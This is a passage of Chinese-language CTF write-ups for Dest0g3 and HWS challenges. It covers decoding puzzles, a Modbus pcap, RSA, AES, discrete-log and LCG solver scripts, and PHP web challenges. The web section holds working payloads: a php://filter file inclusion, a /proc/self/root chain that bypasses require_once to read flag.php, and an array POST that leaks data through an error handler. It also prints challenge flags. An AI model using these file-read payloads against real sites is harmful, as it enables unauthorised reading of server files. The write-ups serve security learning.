<blockquote>
<p>辨别是Brainfuck/Ook!编码，使用在线工具解码：[Brainfuck/Ook! Obfuscation/Encoding <a href="https://www.splitbrain.org/services/ook">splitbrain.org]</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/0c0c85c1672f49479a6dc2be0e5ddf94.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>解出获得：</p>
<p>446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/f73ae5e6532e4414b16ffc0539177ed6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>接着Hex转文字就可以，使用在线工具<a href="https://the-x.cn/zh-cn/encodings/Hex.aspx">HEX转字符 十六进制转字符 hex gb2312 gbk utf8 汉字内码转换 - The X 在线工具 (the-x.cn)</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/0670b90edc9a407f9a1457e45eed2fbc.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>获取flag：Dest0g3{86facac9-0a5d-4047-b702-86cb37ab77b2}</p>
<h3 id="strangetraffic"><a class="markdownIt-Anchor" href="#strangetraffic"></a> StrangeTraffic</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/c329bafcc0113003c060d62f8f99b2e7/StrangeTraffic.pcapng">https://files.buuoj.cn/files/c329bafcc0113003c060d62f8f99b2e7/StrangeTraffic.pcapng</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、下载附件，虚拟机kali打开文件，wireshark分析，可以看出是mudbus工控流量。追踪TCP流，在流0处看到可疑的东西，将展现形式改为Hex转储</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/40498cc937884428b33e0efc49584871.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>2、在尾部存在base64特征编码，手动提取：</p>
<p>RGVzdDBnM3szMUE1QkVBNi1GMjBELUYxOEEtRThFQS0yOUI0RjI1NzEwOEJ9</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/7a35322cfd9a4b458cbe866587f2454d.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/cf147a5e73dd449d98750098326703bd.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>获取flag：Dest0g3{31A5BEA6-F20D-F18A-E8EA-29B4F257108B}</p>
</blockquote>
<h3 id="easyword"><a class="markdownIt-Anchor" href="#easyword"></a> EasyWord</h3>
<p>**题目描述：**Let the word tell u</p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/aae5e40774fcd4089557007b1b030f41/EasyWord.zip">https://files.buuoj.cn/files/aae5e40774fcd4089557007b1b030f41/EasyWord.zip</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>下载附件，打开压缩包，得到一个加密的docm文件，hint提示说六位小写字母加密，并给出了第三位和第五位，于是考虑用工具AOPRT:</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/d4f37e4627004af2911f0a31afd5f141.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>爆破了好几次，结果都不对，别放弃使用该方法。</p>
</blockquote>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
<h3 id="phpdest"><a class="markdownIt-Anchor" href="#phpdest"></a> phpdest</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="http://d10eb908-5734-4807-9b12-493d578d495c.node4.buuoj.cn:81/">http://d10eb908-5734-4807-9b12-493d578d495c.node4.buuoj.cn:81/</a>(环境在Buuctf一直都有，可以自行打开）</p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、点开链接，获得解密源码，第一时间想到的是文件包含，堆叠注入。构建payload试一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/15c694e4a91444b9bc0cce7ce6334798.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>没有回显，对php代码审计，发现 require_once函数，发现干货了</p>
</blockquote>
<blockquote>
<p>require_once() 语句在脚本执行期间包括并运行指定文件。此<a href="http://www.php.cn/php/php-tp-behavior.html">行为</a>和 require() 语句类似，唯一区别是如果该文件中的代码已经被包括了，则不会再次包括。</p>
<p>PHP最新版的小Trick,require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/[pid]`记录了系统运行的信息状态，而`/proc/self`指的是当前进程(自身进程)的pid，就类似于类里面的`this</span><br></pre></td></tr></table></figure>
<p><code>/proc/self/root/</code>是指向<code>/</code>的符号链接</p>
</blockquote>
<blockquote>
<p>构造payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/3af4fa34b35446609646329ab107b20c.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>获得flag.php的源码，base64解码获得flag：</p>
<p>Dest0g3{f05260c1-70e9-481b-89b1-eb397377f621}</p>
</blockquote>
<h3 id="easyphp"><a class="markdownIt-Anchor" href="#easyphp"></a> EasyPHP</h3>
<p>**题目描述：**Post something</p>
<p><strong>附件下载：</strong><a href="http://d7cb2110-b7b2-4ff0-9ce7-a5788de17012.node4.buuoj.cn:81/">d7cb2110-b7b2-4ff0-9ce7-a5788de17012.node4.buuoj.cn:81</a>(环境在Buuctf一直都有，可以自行打开）</p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、点开链接，获取界面：</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/e36c7a302fd44ad392077cd7e4e91506.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>2、没啥干的，直接代码审计</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="comment">//高亮显示，没啥用</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;<span class="comment">//读取fl4g.php文件</span></span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];<span class="comment">//对dest0g3传入参数‘ctf’</span></span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;H&quot;</span>);<span class="comment">//对时间的限制，下同</span></span><br><span class="line"><span class="variable">$timme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;<span class="comment">//如果时间为假，则输出fl4g，反之输出&quot;Try harder!&quot;,很显然时间不可能为假。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(//看到这个函数，就有解了后有详解，既对传入参数进行比对，只要让他运行错误就行。</span><br><span class="line">    function() <span class="keyword">use</span>(&amp;$<span class="title">fl4g</span>) &#123;</span><br><span class="line">        <span class="title">print</span> $<span class="title">fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br><span class="line"><span class="meta">?&gt;</span> Try harder!</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>干货：set_error_handler () 函数<strong>设置用户自定义的错误处理函数</strong>。. 该函数用于创建运行时期间的用户自己的错误处理方法。. 该函数会返回旧的错误处理程序，若失败，则返回 null。</p>
</blockquote>
<blockquote>
<p>3、构建数组报错POST：ctf[]=1</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/dff3286ffba6434fac7bb6c3a38f6ec5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>获取flag：Dest0g3{a57b8d1d-da8f-42ee-a782-3a92bc372ec3}</p>
</blockquote>
<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
<h3 id="babyrsa"><a class="markdownIt-Anchor" href="#babyrsa"></a> babyRSA</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/28e6d9906de54ebfdc565f9ef541bcbf/task.py">https://files.buuoj.cn/files/28e6d9906de54ebfdc565f9ef541bcbf/task.py</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、打开附件，fofa分解n，常规解。上脚本，获取flag。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">c = <span class="number">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span></span><br><span class="line">n = <span class="number">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">q = <span class="number">165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973969401</span></span><br><span class="line">p = <span class="number">165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973971467</span></span><br><span class="line"></span><br><span class="line">d = libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)  <span class="comment"># m 的十进制形式</span></span><br><span class="line">string = long_to_bytes(m)  <span class="comment"># m明文</span></span><br><span class="line"><span class="built_in">print</span>(string)  <span class="comment"># 结果为 b‘ m ’ 的形式</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;Dest0g3&#123;96411aad-032c-20a8-bc43-b473f6f08536&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h3 id="babyaes"><a class="markdownIt-Anchor" href="#babyaes"></a> babyAES</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/ded8ebffd78bc71ff21b41701727c875/task.py">https://files.buuoj.cn/files/ded8ebffd78bc71ff21b41701727c875/task.py</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、打开附件，AES常规解。上脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">iv = <span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">c = <span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line">flag = my_aes.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
</blockquote>
<h3 id="ezdlp"><a class="markdownIt-Anchor" href="#ezdlp"></a> ezDLP</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/67d5c3e2b9ac73c8ebf66665b077e33f/task.py">https://files.buuoj.cn/files/67d5c3e2b9ac73c8ebf66665b077e33f/task.py</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、点开附件，尝试用Pohlig-Hellman 算法的方法，进行解密，但是想不通，就去搜了一下对pow（）逆运算，发现sage有相应的函数，写解密脚本，放到sagemath（<a href="https://sagecell.sagemath.org/">Sage Cell Server (sagemath.org)</a>）中运行。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line">g = <span class="number">19</span></span><br><span class="line">p = <span class="number">335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span></span><br><span class="line">h = <span class="number">199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162</span></span><br><span class="line">d=discrete_log(h,mod(g,p))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#627467212751652661100750674849894892358409405070345081253130721039787502632741519936253501608002590652971133</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#接着在本地环境运行以下代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="number">627467212751652661100750674849894892358409405070345081253130721039787502632741519936253501608002590652971133</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Dest0g3&#123;07ed2a6f-182f-a05d-c81e-1318af820a78&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>赛事Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Web</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>HWS-Crypto</title>
    <url>/2022/08/25/HWS-Crypto/</url>
    <content><![CDATA[<p>这场比赛诶，参加的莫名其妙的，还没来得及复现，就做出来一个Crypto。qwq</p>
<span id="more"></span>
<h3 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h3>
<h4 id="hws-easyrsa"><a class="markdownIt-Anchor" href="#hws-easyrsa"></a> HWS-easyRSA</h4>
<h5 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程：</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = <span class="number">31893593182018727625473530765941216190921866039118147474754069955393226712079257707838327486268599271803</span></span><br><span class="line">seed0 = <span class="number">25820280412859586557218124484272275594433027771091486422152141535682739897353623931875432576083022273940</span></span><br><span class="line">seed1 = <span class="number">24295465524789348024814588142969609603624462580932512051939198335014954252359986260009296537423802567677</span></span><br><span class="line">seed2 = <span class="number">14963686422550871447791815183480974143372785034397446416396172429864269108509521776424254168481536292904</span></span><br><span class="line"></span><br><span class="line">a = (seed2 - seed1) * gmpy2.invert(seed1 - seed0, m) % m</span><br><span class="line">b = (seed1 - a * seed0) % m</span><br><span class="line"></span><br><span class="line">MMI = <span class="keyword">lambda</span> A, m, s=<span class="number">1</span>, t=<span class="number">0</span>, N=<span class="number">0</span>: (m &lt; <span class="number">2</span> <span class="keyword">and</span> t % N <span class="keyword">or</span> MMI(m, A % m, t, s - A // m * t, N <span class="keyword">or</span> m), -<span class="number">1</span>)[m &lt; <span class="number">1</span>]  <span class="comment"># 逆元计算</span></span><br><span class="line">ani = MMI(a, m)</span><br><span class="line">seed = seed2</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    seed = (ani * (seed - b)) % m</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(seed))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>赛事Writeup</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
</search>
